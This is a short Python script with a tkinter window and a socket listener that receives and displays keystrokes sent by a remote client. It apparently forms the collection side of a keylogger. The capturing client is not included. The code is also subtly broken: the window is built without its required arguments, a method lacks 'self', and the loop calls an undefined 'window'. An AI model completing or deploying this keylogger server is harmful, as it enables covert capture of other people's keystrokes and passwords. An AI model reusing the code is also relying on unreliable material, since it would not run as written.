from tkinter import *
from tkinter.messagebox import showinfo
import socket

class ScrollListbox(Frame):
    def __init__(self, root, text, *args, **kwargs):
        super().__init__(root)
        self.label = Label(self, text=text)
        self.label.grid(columnspan=2)
        self.bar = Scrollbar(self)
        self.bar.grid(row=1, column=1, sticky='NS')
        self.box = Listbox(self, yscrollcommand=self.bar.set, **kwargs)
        self.box.grid(row=1, column=0, sticky='NSEW')
        self.bar.config(command=self.box.yview)

    def insert(self, pos, text):
        self.box.insert(pos, text)
        self.update()




class Window(Tk):
    def __init__(self, conn, addr, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.conn = conn
        self.addr = addr

        Label(self, text='Keys Pressed by Client').grid()
        self.box = ScrollListbox(self, text=addr[0])
        self.box.grid(row=1)
        
    def log(conn, addr, message):
        self.box.insert(END, message)

    def remove(self):
        self.destroy()
        



client = None


        
if __name__ == '__main__':
    server = socket.socket()
    ip = socket.gethostbyname(socket.gethostname())
    print(ip)
    server.bind((ip, 31415))
    server.listen(1)
    conn, addr = server.accept()
    client = conn
    g = Window() #server
    while True:
        g.update()
        try: 
            message = conn.recv(2048) 
            if message: 
                window.log(conn, addr, message)
            else: 
                """message may have no content if the connection 
                is broken, in this case we remove the connection"""
                pass
                

        except:
            showinfo('Error', 'Client failed')
            raise SystemExit
        
